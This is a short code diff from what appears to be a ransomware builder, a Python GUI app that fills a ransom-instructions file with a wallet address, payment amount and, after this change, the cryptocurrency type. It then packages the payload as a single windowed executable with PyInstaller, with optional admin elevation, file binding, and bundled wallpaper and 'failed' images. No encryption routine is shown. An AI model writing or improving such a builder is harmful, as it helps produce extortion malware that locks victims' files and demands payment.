@@ -385,7 +385,7 @@ class App(customtkinter.CTk):
             data = file.read()
 
         with open('src\\temp\\instructions.txt', 'w+') as file:
-            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)))
+            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)).replace('CRYPTO', crypto_type))
         
         binder_args = []
 
@@ -394,7 +394,7 @@ class App(customtkinter.CTk):
             shutil.copyfile(path, f'src\\temp\\binder_{filename}')
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
